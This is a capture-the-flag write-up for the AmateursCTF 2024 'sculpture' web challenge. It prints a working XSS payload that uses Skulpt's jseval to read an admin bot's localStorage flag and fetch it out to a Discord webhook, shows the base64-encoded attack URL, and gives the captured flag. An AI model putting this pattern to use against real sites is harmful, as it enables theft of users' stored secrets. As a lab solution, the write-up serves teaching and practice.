---
title: "sculpture"
description: "Client side rendered python turtle sculptures, why don't we play around with them."
points: 302
solves: 95
author: Jozef Steinhübl
date: April 11 2024
---

## Introduction

![task](https://raw.githubusercontent.com/GerlachSnezka/amateursctf/main/assets/2024-web-sculpture.png)

We are given a web page with a python that is powered by [skulpt](https://skulpt.org/) and the source code of the admin bot that will visit our page with our code.

## Analysis

After digging into the source code of the admin bot and website, we can see that the admin bot contains a `flag` in `localStorage` and the website loads the code from the `?code=` parameter and runs it instantly.

The `?code=` parameter is in base64 encoded format, so we have to always encode our code first and then pass it into the URL.

## Solution

After some research in the [skulpt documentation](https://skulpt.org/) and [skulpt repository](https://github.com/skulpt/skulpt) I found in [test_skulpt_interop.py](https://github.com/skulpt/skulpt/blob/master/test/unit3/test_skulpt_interop.py#L6) that we can use `jseval` function to execute javascript code from our python code.

```python #5
"""Unit tests for zero-argument super() & related machinery."""

import unittest

window = jseval("Sk.global")
```

So we can use this function to get the `localStorage` and read the `flag`.

```python
flag = jseval("Sk.global.localStorage.getItem('flag')")
```

but how to get the flag from the admin bot? Easily, we can send the flag to whatever (e.g. discord webhook) and then read it from there.

```python
if __name__ == "__main__":
    flag = jseval("Sk.global.localStorage.getItem('flag')")
    print jseval("Sk.global.fetch('https://discord.com/api/webhooks/{WEBHOOK_ID}/{WEBHOOK_TOKEN}', {method:'POST',headers:{'Content-Type': 'application/json'}, body: JSON.stringify({'content':'"+flag+"'})})")
```

We have to encode the code into base64 and pass it into the admin bot.

```
https://amateurs-ctf-2024-sculpture-challenge.pages.dev/?code=aWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgIGZsYWcgPSBqc2V2YWwoIlNrLmdsb2JhbC5sb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnZmxhZycpIikKICAgIHByaW50IGpzZXZhbCgiU2suZ2xvYmFsLmZldGNoKCdodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy97V0VCSE9PS19JRH0ve1dFQkhPT0tfVE9LRU59Jywge21ldGhvZDonUE9TVCcsaGVhZGVyczp7J0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJ30sIGJvZHk6IEpTT04uc3RyaW5naWZ5KHsnY29udGVudCc6JyIrZmxhZysiJ30pfSkiKQ==
```

![admin bot](https://raw.githubusercontent.com/GerlachSnezka/amateursctf/main/assets/2024-web-sculpture-admin.png)

After a few seconds, we can see the flag in our discord channel:

![discord](https://raw.githubusercontent.com/GerlachSnezka/amateursctf/main/assets/2024-web-sculpture-discord.png)

```
amateursCTF{i_l0v3_wh3n_y0u_can_imp0rt_xss_v3ct0r}
```